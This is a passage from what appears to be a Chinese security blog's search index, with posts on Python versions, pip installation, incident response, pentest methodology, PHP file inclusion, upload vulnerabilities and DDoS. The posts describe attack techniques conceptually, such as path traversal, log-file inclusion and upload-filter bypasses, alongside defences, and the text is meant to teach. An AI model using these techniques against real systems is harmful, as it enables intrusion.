<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python2.x与3.x版本区别]]></title>
    <url>%2F2018%2F09%2F03%2FPython2-x%E4%B8%8E3%E2%80%8B%E2%80%8B-x%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[0x01 【前言】Python的3.0版本，常被称为Python 3000，或简称Py3k。相对于Python的早期版本，这是一个较大的升级。 为了不带入过多的累赘，Python 3.0在设计的时候没有考虑向下相容。 许多针对早期Python版本设计的程式都无法在Python 3.0上正常执行。 为了照顾现有程式，Python 2.6作为一个过渡版本，基本使用了Python 2.x的语法和库，同时考虑了向Python 3.0的迁移，允许使用部分Python 3.0的语法与函数。 新的Python程式建议使用Python 3.0版本的语法。 除非执行环境无法安装Python 3.0或者程式本身使用了不支援Python 3.0的第三方库。目前不支援Python 3.0的第三方库有Twisted, py2exe, PIL等。 大多数第三方库都正在努力地相容Python 3.0版本。即使无法立即使用Python 3.0，也建议编写相容Python 3.0版本的程式，然后使用Python 2.6, Python 2.7来执行。 0x02 【差异点】print函数代替了print语句在Python 2.x中，输出语句使用的是print语句。 但是在Python 3.x中，print语句没有了，取而代之的是print函数。 Python 2.x12&gt;&gt;&gt; print (3, 4) (3, 4) Python 3.x12&gt;&gt;&gt; print(3, 4) 3 4 Python 3.x默认使用UTF-8编码Python 2.x中有ASCII Str(）类型，unicode()是单独的，不是byte类型。 在Python 3.X版本的源代码中，默认使用的是UTF-8编码，从而可以很好地支持中文或其他非英文字符。 例如，输出一句中文，使用Python 2.x和Python 3.x的输出结果如下所示： Python 2.x123&gt;&gt;&gt; str = &apos;迪仔加油啊&apos;&gt;&gt;&gt; str&apos;\xe8\xbf\xaa\xe4\xbb\x94\xe5\x8a\xa0\xe6\xb2\xb9\xe5\x95\x8a&apos; Python 3.x123&gt;&gt;&gt; str = &apos;迪仔加油啊&apos;&gt;&gt;&gt; str&apos;迪仔加油啊&apos; 除法运算和其他语言相比，Python语言的除法非常高端，它的除法运算包含两个元素安抚，分别是/和//，这两个运算符在Python 2.x和Python 3.x中的使用如下所示。 运算符/在Python 2.x中，使用运算符/进行除法运算的方式和Java、C语言相似，整数相除的结果是一个整数，浮点数除法会保留小数点的部分得到一个浮点数的结果。 在Python 3.x中使用运算符/进行除法运算，整数之前的相处，结果也会是浮点数。 Python 2.x12&gt;&gt;&gt; 1/20 Python 3.x12&gt;&gt;&gt; 1/20.5 运算符//使用运算符//进行的除法叫做floor除法，这种除法会对除法的结果自动进行一个floor操作。使用这种运算符进行的除法运算，在Python 2.x和Python 3.x中是一致的。 floor即获取不大于结果值的最大整数（向下取整）。 Python 2.x12&gt;&gt;&gt; -1//2-1 Python 3.x12&gt;&gt;&gt; -1//2-1 异常异常处理改变的地方主要如下。 区别点 Python 2.x Python 3.x 抛出的对象 直接抛出所有类型的对象 只有继承自BaseException的对象才可以被抛出 捕获异常的语法 except Exception, var except Exception as var 异常处理的语法 raise Exception(args) raise Exception, args 异常类的序列和.message属性 有 取消 Python 2.x12345&gt;&gt;&gt; try: ... raise TypeError,&quot;类型错误&quot; ... except TypeError,err: ... print err.message ... 类型错误 Python 3.x12345&gt;&gt;&gt; try: ... raise TypeError(&quot;类型错误&quot;) ... except TypeError as err: ... print(err) ... 类型错误 八进制字面量表示在Python 3.x中，表示八进制字面量的方式只有一种，并且必须写成”0o1000”这样的方式，原来“01000”的方式不能使用了。 Python 2.X1234&gt;&gt;&gt; 01000 512 &gt;&gt;&gt; 0o1000 512 Pyhton 3.x123456&gt;&gt;&gt; 01000 File &quot;&lt;stdin&gt;&quot;, line 1 01000 ^ SyntaxError: invalid token &gt;&gt;&gt; 0o1000 512 不等于运算符 / Python 2.x Python 3.x 不等于运算符的写法 两种，!=和&lt;&gt; 一种，只有！= Python 2.X1234&gt;&gt;&gt; 1 != 2 True &gt;&gt;&gt; 1 &lt;&gt; 2 True Python 3.x1234567&gt;&gt;&gt; 1 != 2 True &gt;&gt;&gt; 1 &lt;&gt; 2 File &quot;&lt;stdin&gt;&quot;, line 1 1 &lt;&gt; 2 ^ SyntaxError: invalid syntax 数据类型 Python 3.X去除了long类型，现在只有一种整型int,但它的行为就像是Python 2.X版本的Long Python 3.X新增了bytes类型，对应于Python 2.X版本的八位串，定义一个bytes字面量的方法如下：123&gt;&gt;&gt; b = b&apos;china&apos; &gt;&gt;&gt; type(b) &lt;class &apos;bytes&apos;&gt; 字符串对象和bytes对象可以使用.encode()(str-&gt;bytes)或者.decode()(bytes-&gt;str)方法相互转化。示例代码如下： 1234&gt;&gt;&gt; s = b.decode() &gt;&gt;&gt; s &apos;china&apos; &gt;&gt;&gt; b1 = s.encode() &gt;&gt;&gt; b1 b&apos;china&apos; Python 3.X中，字典的keys()、items()、和values()方法用返回视图代替了列表，而2.x版本中的iterkeys()等函数都被废弃。同时去掉的还有has_key() 方法，用in替代。]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在Linux中安全pip，可兼容Python 3.x]]></title>
    <url>%2F2018%2F09%2F03%2F%E5%9C%A8Linux%E4%B8%AD%E5%AE%89%E5%85%A8pip%EF%BC%8C%E5%8F%AF%E5%85%BC%E5%AE%B9Python-3-x%2F</url>
    <content type="text"><![CDATA[0x01 【前提】在CentOS7中，默认已经有了Python2.7的存在。直接输入python进入。现在再安装一个python3.7。 0x02 【过程】一、安装Python3.7前往https://www.python.org/downloads/source/下载python3.7。123456tar .zxf Python-3.7.0.tar //解压安装包cd Python-3.7.0 //进到python3目录 ./configrue --prefix=/data/server/python/ //编译make &amp;&amp; make install //安装ln /data/server/python/bin/python3.7 /usr/bin/python3 //创建软连接python3 //进入python3 安装完成！！ 二、接着安装pip，通用的 Python 包管理工具。提供了对 Python 包的查找、下载、安装、卸载的功能。在网上下载pip-10.0.1.zip12345unzip pip-10.0.1.zipcd pip-10.0.1/Python3 setup.py install //安装python3 -m pip install requests //在python3中安装模块python3 -m pip install lxml 1pip instsall requests //在python2中安装模块]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应急响应]]></title>
    <url>%2F2018%2F09%2F03%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%2F</url>
    <content type="text"><![CDATA[0x01 应急响应的背景CERT/CC服务内容 安全事件响应 安全事件分析和软件安全缺陷研究 缺陷知识库开发 信息发布：缺陷、公告、总结、统计、补丁、工具 教育与培训：CSIRT管理、CSIRT技术培训、系统和网络管理员安全培训 指导其它CSIRT（也称IRT、CERT）组织建设。 0x02 应急响应的概念什么是应急响应？是指组织为了应对突发/重大信息安全事件的发生所做的准备以及在事件发生后所采取的措施。 什么是安全事件？安全事件则是指影响一个系统正常工作的情况。这里的系统包括主机范畴内的问题，也包括网络范畴内的问题，例如黑客入侵、信息窃取、拒绝服务攻击、网络流量异常等。 应急响应的描述客户的主机或网络正遭到攻击或发现入侵成功的痕迹，而又无法当时解决和追查来源时，安全服务商根据客户的要求以最快的速度赶到现场，协助客户解决问题，查找后门，保存证据和追查来源。 安全事件的分类（七类）：1、蠕虫类 2、网络攻击类：DOS、DDOS、扫描 3、信息破坏类：网站内容篡改 4、信息内容安全： 5、设备设施故障 6、自然灾害 7、其他 应急响应的目的 应急响应服务的目的是最快速度恢复系统的保密性、完整性和可用性，阻止和减小安全事件带来的影响。 应急响应服务的目的是尽可能地减小和控制住网络安全事件的损失，提供有效的响应和恢复指导，并努力防止安全事件的发生。 应急响应服务的特点 技术复杂性与专业性 知识经验的依赖性 事件突发性 协作能力 应急响应体系是指在突发/重大信息安全事件后对包括计算机运行在内的业务运行进行维持或恢复的各种技术和管理策略和规程 信息安全应急响应体系的制定是一个周而复始、持续改进的过程，包含以下几个阶段： （1）应急响应需求分析和应急响应策略的确定； （2）编制应急响应计划文档； （3）应急响应计划的测试、培训、演练和维护 0x03 应急响应组的组建什么是应急响应组（IRT）应急响应组就是一个或更多的个人组成的团队，能快速执行和处理与安全有关的事件的任务。 为什么需要成立应急响应组 容易协调响应工作 提高专业知识 提高效率 提高先期主动防御能力 更加适合于满足机构的需要 提高联络功能 提高处理制度障碍方面的能力 应急响应相关行业规范GB/T 24364-2009 《信息安全技术 信息安全应急响应计划规范》 GB/T 20988-2007 《信息安全技术 信息系统应急响应规范》 GB/Z 20985-2007 《信息技术 安全技术 信息安全事件管理指南》 GB/Z 20986-2007 《信息安全技术 信息安全事件分类分级指南》 0x03 应急响应六个阶段：准备（preparation）、检测(detection)、遏制(containment)、根除(eradication)、恢复(recovery)、跟踪(follow-up) ——即PDCERF 第一阶段：准备——preparation准备阶段是安全事件响应的第一个阶段，在事件真正发生之前为事件响应做好相应的准备 比如，漏洞扫描、打补丁等，资源准备 第二阶段：检测——detection使用恰当的方法来确认系统或网络中是否出现了恶意代码、网络攻击、目录文件存在被篡改等异常现象 事件标记 信息来源 开启审计 事件定级 响应方式 第三阶段：抑制——containment抑制攻击或破环波及的范围 建议组织机构为几类主要的事故建立单独的抑制策略，其标准包括： 潜在的破坏和资源的窃取 证据保留的需要 服务可用性（例如：网络连接，提供给外部当事方的服务） 实施战略需要的时间和资源 战略的有效性（例如：部分遏制事故，完全遏制事故） 解决方案的期限 第四阶段：根除——eradication找到事件的根源彻底清除，防止攻击者再次使用相同的手段对系统或网络造成破坏，引发新的安全事件。 第五阶段：恢复——recovery业务恢复 第六阶段：跟踪——follow-up关注系统恢复以后的安全状况，特别是曾经出问题的地方；建立跟踪文档，规范记录跟踪结果；对响应效果给出评估；对进入司法程序的事件，进行进一步的调查，打击违法犯罪活 0x04 应急响应预案制定应急响应预案的包括的主要内容 确定风险场景 描述可能受到的业务影响 描述使用的预防性策略 描述应急响应策略 识别和排列关键应用系统 行动计划 团队和人员的职责 联络清单 所需资源配置 成功预案的特点 清楚、简洁 高级管理层支持/组织承诺 不断改进和更新的恢复策略 及时的更新维护]]></content>
      <categories>
        <category>安全运维</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试浅析]]></title>
    <url>%2F2018%2F09%2F02%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[渗透测试（Penetration testing Pentest）通过实际的攻击进行安全测试与评估的方法。 渗透测试过程一般需要对目标系统进行主动探测分析，以发现潜在的系统漏洞，包括不恰当的系统配置，已知或未知的软硬件漏洞，以及在安全计划与相应过程中的操作性弱点等 黑盒测试（Black-box texting）设计为模拟一个客户组织一无所知的攻击者所进行的渗透攻击 采用这种方式时，渗透测试团队将从一个远程网络未知来评估目标网络基础设施，并没有任何目标网络内部拓扑等相关信息，他们完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中的一些一直活的安全漏洞，并评估。黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。。费时费力 需要高技术 高逼格 白盒测试（White-box Testing）渗透测试者在拥有客户组织所有知识的情况下所进行的渗透测试。 以了解到关于目标环境的所有内部与底层知识 因此最小代价发现和验证系统中最严重的安全漏洞。 不需要情报收集 和目标定位 可以在部署和开发周期中进行集成 时间少代价低 最大的问题是无法有效的测试客户组织的应急响应程序 也无法判断出他们的安全防护计划对检测特定攻击的效率 灰盒测试（Grey-box）黑白组合可以提供对目标系统更加深入和全面的安全审查 测试用例安全测试方法学开源手册（ossmm）物理安全、人类心理学、数据网络、无线通信媒介和电讯通信五类用例。 网络安全测试指南（NIST SP 800-42）OWASP十大Web应用安全威胁项目 ：owasp top 10 只关注具有最高风险的Web领域，不是一个普适性的渗透测试方法指南。 Web安全威胁分类标准（WASC-TC）全面地给出目前web领域中的漏洞、攻击与防范措施视图。 完整方法论：PTES渗透测试执行标准（渗透测试7个阶段）一、前期交互阶段（Pre-Engagement Interaction） 渗透测试团队与客户组织进行交互讨论，最重要的是确定测试范围、目标、限制条件以及服务合同细节。该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动 二、情报收集阶段（Information Gathering） Google Hacking 在目标范围确定后，渗透测试团队可以利用各种信息来源与收集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。 渗透测试者可以使用的情报搜集方法包括公开来源的信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务检查等。对目标系统的情报探查能力是渗透测试者一项非常重要的技能，情报搜集是否充分在很大程度上决定了渗透测试的成败，因为如果你遗漏关键的情报信息，你将有可能在后面的阶段里一无所获。 三、威胁建模阶段(Threat Modeling) 在搜集到充分的情报信息之后，渗透测试团队的成员们停下敲击键盘，大家聚集到一起针对获取的信息进行威胁建模与攻击规划。这是渗透测试过程中非常重要，但很容易被忽视的一个关键点。 通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道。 四、漏洞分析阶段(Vulnerablity Analysis) Exp：渗透代码 POC：验证性的渗透攻击代码 在确定出最可行的攻击通道之后，接下来需要考虑该如何取得目标系统的访问控制权。在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，希望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。 五、渗透攻击阶段（Exploitation） 清除痕迹 渗透攻击是渗透测试过程中最具有魅力的环节。在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。 渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。 六、后渗透攻击阶段（Oost Exploitation） 是整个渗透测试过程中最能体现渗透测试团队创造力与技术能力的环节。前面都在是在按部就班的完成非常普遍的目标，而在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。 在不同的测试场景中，这些攻击目标与途径可能是千变万化的，要求测试团队具有很强的创新意识、知识范畴、实际经验和技术能力。 假设测试对象为一个软件开发企业，核心业务是定制开发软件，渗透测试者可能拿到web权限，能否修改下载链接中的程序源码植入后门呢，造成的是企业声誉的影响。 七、报告阶段（Reporting） 渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和挖掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。 比如，一个sql注入漏洞，一般报告中会写出，对所有用户输入进行检查过滤，使用参数化的sql查询语句，在一个受限的用户账户上运行sql语句，以及使用定制的出错消息。但从客户角度按此修补并不完全，根本原因很可能是采用了不安全的第三方应用或者由不可控第三方开发。 安全漏洞生命周期在渗透测试流程中，核心内容是找出目标系统中存在的安全漏洞，并实施渗透攻击，从而进入到西永中，而这一过程最主要的底层基础是目标系统中存在的安全漏洞（Vulnerability）。安全漏洞指信息系统中存在的缺陷或不适当的配置，它们可使用、攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险。利用安全漏洞来造成入侵或破坏效果的程序就称为渗透代码（Exploit），或者漏洞利用代码。 安全漏洞指信息系统中存在的缺陷或不适当的配置，它们可使攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险。利用安全漏洞来造成入侵或破坏效果的程序就称为渗透代码(Exploit)，或者漏洞利用代码。 围绕着安全漏洞生命周期所进行的攻防技术，一直是安全社区永恒的话题，而一个典型的安全路东生命周期包括如下7部分： 1、 安全漏洞研究与挖掘 由高技术水平的黑客与渗透测试师开展，主要利用源代码审核(白盒测试)、逆向工程(灰盒测试)、Fuzz测试(黑盒测试)等方法，挖掘目标系统中存有的可被利用的安全漏洞。 2、渗透代码开发与测试 在安全漏洞挖掘的同时，黑客会开发概念验证性的渗透攻击代码(POC)，用于验证找到的安全漏洞是否确实存在，并确认其是否可被利用。 3、安全漏洞和渗透代码在封闭团队中流传 在发现安全漏洞并给出渗透攻击代码后，负责任的“白帽子”们采取的处理策略是首先通知厂商进行修补，而在厂商给出补丁后再进行公布；而“黑帽子”与“灰帽子”一般在封闭小规模团队中进行秘密地共享，以充分地利用这些安全漏洞和渗透攻击代码所带来的攻击价值。 4、安全漏洞和渗透代码开始扩散 由于各种原因，在封闭团队中秘密共享的安全漏洞和渗透代码最终会被披露出来，在互联网上得以公布，“黑帽子”会快速对其进行掌握和应用，并在安全社区中快速扩散。 5、恶意程序出现并开始传播 “黑帽子”将在掌握安全漏洞和渗透代码基础上，进一步开发更易使用、更具自动化传播能力的恶意程序，并通过黑客社区社会组织结构和互联网进行传播。在此过程中(或之前或之后)，厂商完成补丁程序开发和测试，并进行发布。 6、 渗透代码/恶意程序大规模传播并危害互联网 厂商发布补丁程序和安全警报将进一步地让整个黑客社区了解出现新的安全漏洞和相应的渗透代码、恶意程序，更多的“黑帽子”将从互联网或社区关系网获得并使用这些恶意程序，对互联网的危害也在这个阶段达到顶峰。 7、渗透攻击代码/攻击工具/恶意程序逐渐消亡 在厂商补丁程序、安全公司提供的检测和移除机制得到广泛应用后，相应的渗透代码、恶意程序将被“黑帽子”逐渐抛弃，从而慢慢消亡。 安全漏洞生命周期如下图： 在安全漏洞生命周期内，从安全漏洞被发现到厂商发布补丁程序用于修补该漏洞之前，安全社区普遍称为”0day”。在这段时间，黑客们攻击存有该安全漏洞的目标可以达到百分之百的成功率，同时也可以躲避检测，在“0day”的安全漏洞和对应的渗透代码对于黑客社区具有很高的价值，挖掘“0day”安全漏洞并给出渗透代码也成为高水平黑客的追求目标。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP安全]]></title>
    <url>%2F2018%2F09%2F02%2FPHP%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[PHP是一种非常流行的Web开发语言。在Python、Ruby等语言兴起的今天，PHP仍然是众多开发者所喜爱的选择，在中国尤其如此。 PHP的语法过于灵活，这也给安全工作带来了一些困扰。同时PHP也存在很多历史遗留的安全问题。 在PHP语言诞生之初，互联网安全问题尚不突出，许多今天已知的安全问题在当时并未显现，因此PHP语言设计上一开始并没有过多地考虑安全。时至今日，PHP遗留下来的历史安全问题依然不少，但PHP的开发者与整个PHP社区也想做出一些改变。 0x01 文件包含漏洞文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。 严格来说，文件包含漏洞是“代码注入”的一种。在“注入攻击”一章中，曾经提到过“代码注入”这种攻击，其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行。“代码注入”的典型代表就是文件包含（File Inclusion）。文件包含可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。 PHP:include(), include_once(), require(), require_once(), fopen(), readfile(), … JSP/Servlet:ava.io.File(), java.io.FileReader(), … ASP:include file, include virtual 文件包含是PHP的一种常见用法，主要由4个函数完成： include() require() include_once() require_once() 当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。这一特性，在实施攻击时将非常有用。 漏洞危害 执行恶意代码 包含恶意文件控制网站 甚至控制网站服务器等 0x02 文件包含类型本地包含本地文件包含（Local File Include，LFI），LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。 使用“../../../”这样的方式来返回到上层目录中，这种方式又称为“目录遍历”（Path Traversal），常见的目录遍历漏洞，还可以通过不同的编码方式来绕过一些服务端逻辑。例如%2e%2e%2f等同于../ 本地文件包含的利用技巧 远程文件包含漏洞之所以能够执行命令，就是因为攻击者能够自定义被包含的文件内容。因此本地文件包含漏洞想要执行命令，也需要找到一个攻击者能够控制内容的本地文件。 经过不懈的研究，安全研究者总结出了以下几种常见的技巧，用于本地文件包含后执行PHP代码。 （1）包含用户上传的文件。 （2）包含data:// 或php://input等伪协议。 （3）包含Session文件。 （4）包含日志文件，比如Web Server的access log。 （5）包含/proc/self/environ文件。 （6）包含上传的临时文件（RFC1867）。 （7）包含其他应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。 远程包含远程文件包含（Remote File Include，RFI）， RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用，出现的频率没有本地包含多。 风险：攻击者可利用代码注入漏洞执行任意代码，来操作服务器；攻击者可利用代码注入漏洞操作数据库，插入恶意数据，可能获取系统权限；代码注入攻击后可以进一步对网络渗透，由于代码注入攻击多半可获取系统权限，对网络的进一步渗透难度大大降低。 Metasploit中包含一个脚本自动化完成包含日志文件的攻击： 0x03 挖掘经验模块加载、cache调用，传入的参数拼接包含路径 include() 使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 inclue_once() 功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 require() 使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 requre_once() 功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 文件包含修复方案 关闭远程包含参数开关，彻底切断这个业务相比较 设置类似白 名单的方法，筛选固定文件名 常见目录穿越字符进行过滤，如（./ .// ..\等） 0x04 变量覆盖漏洞全局变量覆盖变量如果未被初始化，且能被用户所控制，那么狠可能会导致安全问题，而在PHP中，这种情况在register_globals为ON时尤其严重。 extract（）变量覆盖 遍历初始化变量 import_request_variables变量覆盖 parse_str()变量覆盖 还有一些变量覆盖的方法，难以一次列全，但有以下安全建议： 首先，确保register_globals =OFF。若不能自定义php.ini，则应该在代码中控制。 其次，熟悉可能造成变量覆盖的函数和方法，检查用户是否能控制变量的来源。 最后，养成初始化变量的好习惯。 代码执行漏洞“危险函数”执行代码文件包含漏洞是可以造成代码执行的。但在PHP中，能够执行代码的方式远不止文件包含漏洞一种，比如危险函数popen()、system()、passthru()、exec()等都可以直接执行系统命令。此外，eval()函数也可以执行PHP代码。还有一些比较特殊的情况，比如允许用户上传PHP代码，或者是应用写入到服务器的文件内容和文件类型可以由用户控制，都可能导致代码执行 phpMyAdmin 3.4.3.远程代码执行漏洞 MyBB 1.4远程代码执行漏洞 挖掘漏洞的过程，通常需要先找到危险函数，然后回溯函数的调用过程，最终看在整个调用的过程中用户是否有可能控制输入 0x05 制定安全的PHP环境通过配置php.ini来加固PHP的运行环境：register_globals 当register_globals = ON时，PHP不知道变量从何而来，也容易出现一些变量覆盖的问题。因此从最佳实践的角度，强烈建议设置register_globals = OFF，这也是PHP新版本中的默认设置。 open_basedir open_basedir可以限制PHP只能操作指定目录下的文件。这在对抗文件包含、目录遍历等攻击时非常有用。我们应该为此选项设置一个值。需要注意的是，如果设置的值是一个指定的目录，则需要在目录最后加上一个“/”，否则会被认为是目录的前缀。 ￼open_basedir = /home/web/html/ allow_url_include 为了对抗远程文件包含，请关闭此选项，一般应用也用不到此选项。同时推荐关闭的还有allow_url_fopen。 allow_url_fopen = Off￼ allow_url_include = Off display_errors 错误回显，一般常用于开发模式，但是很多应用在正式环境中也忘记了关闭此选项。错误回显可以暴露出非常多的敏感信息，为攻击者下一步攻击提供便利。推荐关闭此选项。 display_errors = Off log_errors 在正式环境下用这个就行了，把错误信息记录在日志里。正好可以关闭错误回显。 log_errors = On magic_quotes_gpc 推荐关闭，它并不值得依赖（请参考“注入攻击”一章），已知已经有若干种方法可以绕过它，甚至由于它的存在反而衍生出一些新的安全问题。XSS、SQL注入等漏洞，都应该由应用在正确的地方解决。同时关闭它还能提高性能。￼ magic_quotes_gpc = OFF cgi.fix_pathinfo 若PHP以CGI的方式安装，则需要关闭此项，以避免出现文件解析问题（请参考“文件上传漏洞”一章）。 cgi.fix_pathinfo = 0 session.cookie_httponly 开启HttpOnly（HttpOnly的作用请参考“跨站脚本攻击”一章）。 session.cookie_httponly = 1 session.cookie_secure 若是全站HTTPS则请开启此项。 session.cookie_secure =1 safe_mode PHP的安全模式是否应该开启的争议一直比较大。一方面，它会影响很多函数；另一方面，它又不停地被黑客们绕过，因此很难取舍。如果是共享环境（比如App Engine），则建议开启safe_mode，可以和disable_functions配合使用；如果是单独的应用环境，则可以考虑关闭它，更多地依赖于disable_functions控制运行环境安全。]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件包含漏洞，PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2018%2F09%2F02%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件上传漏洞文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 文件上传后导致的常见安全问题一般有： 上传文件的Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行。 上传文件是Flash的策略文件ceossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似） 上传文件的钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。 文件上传漏洞一般的欧式指“上传Web脚本能够服务器解析”的问题。 FCKEditor是一款非常流行的富文本编辑器 设计安全的文件上传功能 文件上传的目录设置为不可执行 判断文件类型 使用随机数改写文件名和文件路径 单独设置文件服务器的域名 漏洞危害上传文件的时候，服务器端脚本语言未对上传的文件进行严格的验证和过滤，就有可能上传恶意的文件，从而控制整个网站，甚至是服务器。 漏洞条件文件可以上传、知道文件上传的路径、上传文件可以被访问、上传文件可以被执行 文件上传可控点Content-Length,即上传内容大小 MAX_FILE_SIZE,即上传内容的最大长度 filename,即上传文件名 Content-Type,即上传文件类型 请求包中的乱码字段，即是所上传文件的内容 有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现 挖掘思路 上传点都调用同一个上传类，直接全局搜索上传函数 黑盒寻找上传点，代码定位 代码案例 name：客户端的原始上传文件名称 Type：上传文件的MIME类型 Tmp_name：服务器端用来保存上传文件的临时文件路径 Error：上传文件时的错误信息 Size：上传文件的大小，单位 文件上传绕过客户端 用firebug将form表单中的onsubmit事件删除 上传木马文件，Burp拦截数据包，修改扩展名 文件上传绕过服务端 黑白名单过滤 修改MIME类型 截断上传攻击 .htaccess文件攻击 目录验证 防护方案 检测文件上传内容 黑白名单验证，检测文件扩展名是否合法 MIME验证，检测文件的MIME类型 限制文件大小 更改临时文件夹的路径 读取上传文件的绝对路径与文件名称 隐藏文件路面]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应用层拒绝服务攻击]]></title>
    <url>%2F2018%2F09%2F02%2F%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[0x01 DDOS简介DDOS又称为分布式拒绝服务，全称是Distrbuted Denial of Service。DDOS本是利用合理的请求造成资源过载，导致服务不可用。 分布式拒绝服务DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。 常见的DDOS攻击有SYN flood、UDP flood、ICMP flood等。其中SYN flood是一种最为经典的DDOS攻击，其发现于1996年，但至今仍然保持着非常强大的生命力。 0x02 DDOS攻击示意图： TCP三次握手： （1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x； （2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号x+1和服务器端的初始序列号y； （3）客户端收到服务器端返回的SYN+ACK报文后，向服务器端返回一个确认号为y+1、序号为x+1的ACK报文，一个标准的TCP连接完成。 可是SYN flood在攻击时，首先伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYN 